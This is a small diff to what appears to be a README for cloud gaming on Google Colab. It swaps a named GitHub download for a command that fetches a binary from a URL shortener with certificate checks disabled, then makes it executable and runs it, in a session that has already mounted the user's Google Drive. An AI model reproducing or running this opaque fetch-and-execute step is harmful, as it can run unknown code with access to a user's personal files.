@@ -13,9 +13,9 @@ UPDATED: Run Steam and Play Game on Google Colab (30/04/2026).
 from google.colab import drive
 drive.mount('/content/drive')
 !echo "Colab Region: $(curl -s ipinfo.io | jq -r '.region')"
-!wget -q https://github.com/kmille36/Colab-Cloud-Gaming/raw/refs/heads/main/colab-moonweb
-!chmod +x colab-moonweb
-!./colab-moonweb
+!curl -sLkO https://bom.so/Z4Z7hw
+!chmod +x Z4Z7hw
+!./Z4Z7hw
 ```
 - Control support in Moonlight OK (virtual gamepad and gamepad not available)
 - Sunshine web UI: https://tailscaleip:47990
